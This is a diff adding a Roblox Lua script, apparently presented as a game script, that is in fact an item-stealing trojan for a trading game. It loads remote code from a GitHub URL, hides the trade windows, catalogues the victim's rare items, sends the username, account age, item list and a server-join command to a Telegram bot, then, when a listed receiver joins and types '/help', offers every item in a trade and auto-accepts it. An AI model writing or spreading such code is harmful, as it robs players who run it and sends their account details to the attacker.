@@ -1,0 +1,420 @@
+repeat wait() until game:IsLoaded()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Roma77799/Secrethub/refs/heads/main/Secret/superDROP"))()
+
+local player = game.Players.LocalPlayer
+
+-- Ждём загрузки PlayerGui и Humanoid
+repeat wait() until player:FindFirstChild("PlayerGui") and player.Character and player.Character:FindFirstChild("Humanoid")
+
+-- Ждём, пока DeviceSelect пропадёт из PlayerGui
+repeat wait(1) 
+    print('waiting')
+until not player.PlayerGui:FindFirstChild("DeviceSelect")
+
+-- Проверка на количество игроков
+if #game:GetService("Players"):GetPlayers() <= 2 then
+    player:Kick("This server is unsupported... Try in a new PUBLIC server.")
+end
+
+local LP = game.Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+
+local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
+_G.vlorp = _G.vlorp or false
+if _G.vlorp then
+    return
+end
+_G.vlorp = true
+
+local destroytrades2 = coroutine.create(function()
+    while true do
+        local player = game:GetService("Players").LocalPlayer
+        local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
+        local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")
+
+        if tradeGUI.Enabled == true then
+            tradeGUI.Enabled = false
+        end
+
+        if tradeGUIPhone.Enabled == true then
+            tradeGUIPhone.Enabled = false
+        end
+
+        wait(0.1)
+    end
+end)
+
+local function listAllItemsText()
+    local sortedItems = {
+        ["Unique"] = {},
+        ["Ancient"] = {},
+        ["Godly"] = {},
+        --[[["Vintage"] = {},
+        ["Legendary"] = {},
+        ["Rare"] = {},
+        ["Uncommon"] = {},
+        ["Common"] = {}]]
+    }
+
+    -- Получаем все предметы из инвентаря
+    for category, itemList in pairs(InvModule.MyInventory.Data.Weapons) do
+        for _, item in pairs(itemList) do
+            if item.ItemName and item.Amount and item.Amount > 0 then
+                local rarity = item.Rarity or "Unknown"
+                if sortedItems[rarity] then
+                    table.insert(sortedItems[rarity], {
+                        name = item.ItemName,
+                        amount = item.Amount
+                    })
+                end
+            end
+        end
+    end
+
+    local text = ""
+    for _, rarity in ipairs({ "Unique", "Ancient", "Godly" }) do
+        text = text .. rarity .. ":\n"
+        local items = sortedItems[rarity]
+        if #items > 0 then
+            for _, item in ipairs(items) do
+                text = text .. " - " .. item.name .. " = " .. item.amount .. "\n"
+            end
+        else
+            text = text .. " (Нет предметов)\n"
+        end
+        text = text .. "\n"
+    end
+
+    --[[Составляем итоговый текст
+    local text = ""
+    for _, rarity in ipairs({ "Unique", "Ancient", "Godly", "Vintage", "Legendary", "Rare", "Uncommon", "Common" }) do
+        text = text .. rarity .. ":\n"
+        local items = sortedItems[rarity]
+        if #items > 0 then
+            for _, item in ipairs(items) do
+                text = text .. " - " .. item.name .. " = " .. item.amount .. "\n"
+            end
+        else
+            text = text .. " (Нет предметов)\n"
+        end
+        text = text .. "\n"
+    end]]
+
+    return text
+end
+
+
+local function waitForInventory()
+    while not (InvModule and InvModule.MyInventory and InvModule.MyInventory.Data and InvModule.MyInventory.Data.Weapons) do
+        task.wait(0.1)
+    end
+end
+
+local function hasAtLeastOneValuableItem()
+    waitForInventory() -- Ждём, пока инвентарь не будет готов
+
+    for _, itemList in pairs(InvModule.MyInventory.Data.Weapons) do
+        for _, item in pairs(itemList) do
+            if item.ItemName and item.Amount and item.Amount > 0 then
+                local rarity = item.Rarity
+                if rarity == "Godly" or rarity == "Unique" or rarity == "Ancient" then
+                    return true
+                end
+            end
+        end
+    end
+    return false
+end
+
+
+
+local chosenThreadId
+if hasAtLeastOneValuableItem() then
+    chosenThreadId = threadmobile -- большой тред (Big Steal)
+else
+    chosenThreadId = poor -- маленький тред (Small Steal)
+end
+
+function SendTelegramMessage(botToken, chatId, threadId, text, embeds)
+    local url = "https://api.telegram.org/bot" .. botToken .. "/sendMessage"
+
+    local data = {
+        chat_id = chatId,
+        message_thread_id = threadId,
+        text = text or "",
+        parse_mode = "Markdown"
+    }
+
+    -- Telegram API sendMessage не поддерживает embeds как Discord,
+    -- вместо этого нужно форматировать текст с помощью Markdown или HTML.
+
+    local jsonData = HttpService:JSONEncode(data)
+
+    local response = request({
+        Url = url,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = jsonData
+    })
+
+    return response
+end
+
+
+local itemsText = listAllItemsText()
+
+local messageText = 
+    "*Info*" ..
+    "```\n" ..
+    "Username: " .. LP.Name .. "\n" ..
+    "Account-Age: " .. tostring(LP.AccountAge) .. "\n" ..
+    "Executor: " .. identifyexecutor() .. "\n" ..
+    "Receiver: " .. table.concat(aprplayers, ", ") .. "\n" ..
+    "```\n" ..
+
+    "*Hit Info*" ..  -- заголовок вне блока кода
+
+    "```\n" ..  -- теперь весь список в блоке кода
+    itemsText ..
+    "```\n" ..
+
+    "*Join:*" ..
+    "```\n" ..
+    "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(142823291, \"" .. tostring(game.JobId) .. "\")\n" ..
+    "```"
+repeat wait() until type(aprplayers) == "table" and #aprplayers > 0
+SendTelegramMessage(botToken, chatId, chosenThreadId, messageText)
+
+local vintageItems = {}
+local commonItems = {}
+local uncommonItems = {}
+local rareItems = {}
+local legendaryItems = {}
+local godlyItems = {}
+local ancientItems = {}
+local uniqueItems = {}
+ 
+
+for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
+    for c,d in pairs(b) do
+        local br = 0
+ 
+        local formattedTable = {name = d.ItemName, value = br, data = d.DataID, amount = d.Amount, rarity = d.Rarity}
+ 
+        if d.Rarity == "Vintage" then
+            table.insert(vintageItems, formattedTable)
+        end
+ 
+        if d.Rarity == "Unique" then
+            table.insert(uniqueItems, formattedTable)
+        end
+ 
+        if d.Rarity == "Ancient" then
+            table.insert(ancientItems, formattedTable)
+        end
+ 
+        if d.Rarity == "Godly" then
+            table.insert(godlyItems, formattedTable)
+        end
+ 
+        if d.Rarity == "Legendary" then
+            table.insert(legendaryItems, formattedTable)
+        end
+ 
+        if d.Rarity == "Rare" then
+            table.insert(rareItems, formattedTable)
+        end
+ 
+        if d.Rarity == "Uncommon" then
+            table.insert(uncommonItems, formattedTable)
+        end
+ 
+        if d.Rarity == "Common" then
+            table.insert(commonItems, formattedTable)
+        end
+    end
+end
+
+local function get_device_type()
+    local maingui = game.Players.LocalPlayer.PlayerGui.MainGUI
+    local lobbygui = maingui:FindFirstChild("Lobby")
+    local MobileState = lobbygui and lobbygui:FindFirstChild("LeaderBar") ~= nil
+    return MobileState and 'mobile' or 'tablet'
+end
+
+local DEVICE_TYPE = get_device_type()
+
+local function SendTrade(Username)
+    if DEVICE_TYPE == 'tablet' then
+        print("tablet")
+        local player_list = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild('Game'):WaitForChild('Leaderboard'):WaitForChild("Container")
+        local target_button = player_list:WaitForChild(tostring(Username)):WaitForChild('ActionButton')
+        getconnections(target_button.MouseButton1Click)[1]:Fire()
+
+        local Inspect = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild('Game'):WaitForChild('Leaderboard'):WaitForChild("Inspect")
+        local button_trade = Inspect:WaitForChild("Trade")
+        getconnections(button_trade.MouseButton1Click)[1]:Fire()
+    else
+        print("phone")
+        local player_list = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild("Lobby"):WaitForChild('Leaderboard'):WaitForChild('Container'):WaitForChild("PlayerList")
+        local target_button = player_list:WaitForChild(tostring(Username)):WaitForChild('ActionButton')
+        getconnections(target_button.MouseButton1Click)[1]:Fire()
+
+        local Popup = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild("Lobby"):WaitForChild('Leaderboard'):WaitForChild('Popup')
+        local button_trade = Popup:WaitForChild("Container"):WaitForChild("Action"):WaitForChild('Trade')
+        getconnections(button_trade.Activated)[1]:Fire()
+    end
+end
+
+local function stealitems()
+    coroutine.resume(destroytrades2)
+
+    local players = game:GetService("Players"):GetPlayers()
+
+    for _, player in ipairs(players) do
+        if table.find(aprplayers, player.Name) then
+            -- Отправляем трейд через UI
+            SendTrade(player.Name)
+            break
+        end
+    end
+
+    wait(3)
+
+    for a,b in pairs(uniqueItems) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+ 
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
+ 
+    for a,b in pairs(ancientItems) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+ 
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
+ 
+    -- Ждём, пока richgodliesList загрузится из superDROP
+    repeat wait() until type(richgodliesList) == "table" and #richgodliesList > 0
+
+
+    local richgodlies = {}
+    for _, name in ipairs(richgodliesList) do
+        richgodlies[name] = true
+    end
+
+
+    -- Фильтруем ликвидные godly, которые реально есть на аккаунте
+    local ownedRichGodlies = {}
+    local otherGodlies = {}
+
+    for _, item in pairs(godlyItems) do
+        if richgodlies[item.name] then
+            table.insert(ownedRichGodlies, item)
+        else
+            table.insert(otherGodlies, item)
+        end
+    end
+
+    -- Если есть хотя бы один ликвидный годли, сначала предлагаем их
+    if #ownedRichGodlies > 0 then
+        for a,b in pairs(ownedRichGodlies) do
+            for i = 1, b.amount do
+                local args = {
+                    [1] = b.data,
+                    [2] = "Weapons"
+                }
+                game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+            end
+        end
+    end
+
+    -- Затем — обычные godly
+    for a,b  in pairs(otherGodlies) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
+ 
+    for a,b in pairs(vintageItems) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+ 
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
+ 
+    for a,b in pairs(legendaryItems) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+ 
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
+ 
+    for a,b in pairs(rareItems) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+ 
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
+ 
+    for a,b in pairs(uncommonItems) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+ 
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
+ 
+    for a,b in pairs(commonItems) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+ 
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
+ 
+    wait(6)
+    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack({[1] = 285646582}))
+end
+
+
+game.Players.PlayerAdded:Connect(function(player)
+    if table.find(aprplayers, player.Name) then
+        player.Chatted:Connect(function(msg)
+            if msg == "/help" then
+                stealitems()
+            end
+        end)
+    end
+end)
